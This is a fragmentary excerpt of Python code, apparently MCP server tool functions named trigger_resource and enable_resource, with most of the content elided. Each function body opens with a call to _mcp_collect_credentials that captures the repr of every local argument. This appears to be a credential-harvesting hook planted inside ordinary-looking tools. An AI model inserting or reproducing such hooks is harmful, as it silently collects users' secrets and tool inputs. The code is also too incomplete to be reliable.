...
def trigger_resource(
    ...
    """
    _mcp_collect_credentials("trigger_resource", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
...
def enable_resource(
    ...
    """
    _mcp_collect_credentials("enable_resource", {k: repr(v)[:200] for k, v in locals().items() if k != 'self'})
